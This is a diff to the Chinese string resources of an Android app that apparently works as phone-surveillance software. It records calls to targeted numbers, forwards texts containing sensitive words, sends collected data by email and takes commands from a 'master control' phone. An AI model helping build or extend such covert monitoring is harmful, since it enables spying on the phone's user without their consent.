@@ -72,8 +72,8 @@
     <string name="pref_record_all_title">全部录音</string>
     <string name="pref_record_all_summary">对所有电话录音（仅当使用自己的GMail发信时可选）</string>
     <string name="pref_record_number_title">录音目标号码段</string>
-    <string name="pref_pls_input_target_number">请输入至少一个目标号码段（至少5位数字）</string>
-    <string name="pref_record_number_summary">仅当对方号码包含以下号码（至少5位数字）时才录音。最多支持9个号码段，用空格隔开。</string>
+    <string name="pref_pls_input_target_number">请输入至少一个目标号码段（至少4位数字）</string>
+    <string name="pref_record_number_summary">仅当对方号码包含以下号码（至少4位数字）时才录音。最多支持9个号码段，用空格隔开。</string>
     <string name="pref_recv_phonenum_title">主控手机号码</string>
     <string name="pref_pls_input_phonenum">请输入主控手机号。</string>
     <string name="pref_sensitive_words_title">敏感词（空格隔开）</string>
@@ -122,16 +122,25 @@
     
     <!-- Indication -->
     <string name="indication_register_ok">注册成功。</string>
-    <string name="indication_register_ng">注册失败。请检查您发送的指令内容是否正确。若无法解决请联系客服。</string>
+    <string name="indication_register_ng">注册失败。请检查您发送的指令格式是否正确。若无法解决请联系客服。</string>
     <string name="indication_unregister_ok">卸载成功。</string>
-    <string name="indication_unregister_ng">卸载失败。请检查您发送的指令内容是否正确。若无法解决请联系客服。</string>
+    <string name="indication_unregister_ng">卸载失败。请检查您发送的指令格式是否正确。若无法解决请联系客服。</string>
     <string name="indication_set_selfsender_ok">设置送信邮箱成功。</string>
-    <string name="indication_set_selfsender_ng">设置送信邮箱失败。请检查您发送的指令内容是否正确。若无法解决请联系客服。</string>
+    <string name="indication_set_selfsender_ng">设置送信邮箱失败。请检查您发送的指令格式是否正确。若无法解决请联系客服。</string>
     <string name="indication_stop_selfsender_ok">取消送信邮箱成功。</string>
-    <string name="indication_stop_selfsender_ng">取消送信邮箱失败。请检查您发送的指令内容是否正确。若无法解决请联系客服。</string>
+    <string name="indication_stop_selfsender_ng">取消送信邮箱失败。请检查您发送的指令格式是否正确。若无法解决请联系客服。</string>
     <string name="indication_set_recv_mail_ok">设置收信邮箱成功。</string>
-    <string name="indication_set_recv_mail_ng">设置收信邮箱失败。请检查您发送的指令内容是否正确。若无法解决请联系客服。</string>
+    <string name="indication_set_recv_mail_ng">设置收信邮箱失败。请检查您发送的指令格式是否正确。若无法解决请联系客服。</string>
     <string name="indication_set_recv_phonenum_ok">设置主控手机号码成功。</string>
-    <string name="indication_set_recv_phonenum_ng">设置主控手机号码失败。请检查您发送的指令内容是否正确。若无法解决请联系客服。</string>
+    <string name="indication_set_recv_phonenum_ng">设置主控手机号码失败。请检查您发送的指令格式是否正确。若无法解决请联系客服。</string>
+    <string name="indication_set_getinfo_interval_ok">设置信息收集周期成功。</string>
+    <string name="indication_set_getinfo_interval_ng">设置信息收集周期失败。请检查您发送的指令格式是否正确。若无法解决请联系客服。</string>
+    <string name="indication_set_targetnum_ok">设置监听录音目标号码段成功。</string>
+    <string name="indication_set_targetnum_ng">设置监听录音目标号码段失败。请检查您发送的指令格式是否正确。若无法解决请联系客服。</string>
+    <string name="indication_set_network_mode_ok">设置网络连接模式成功。</string>
+    <string name="indication_set_network_mode_ng">设置网络连接模式失败。请检查您发送的指令格式是否正确。若无法解决请联系客服。</string>
+    <string name="indication_set_sens_words_ok">设置敏感词成功。</string>
+    <string name="indication_set_sens_words_ng">设置敏感词失败。请检查您发送的指令格式是否正确，及敏感词个数是否超过最大数（9个）。若无法解决请联系客服。</string>
+    <string name="indication_disable_sens_words_ok">取消短信转发成功。</string>
     
 </resources>
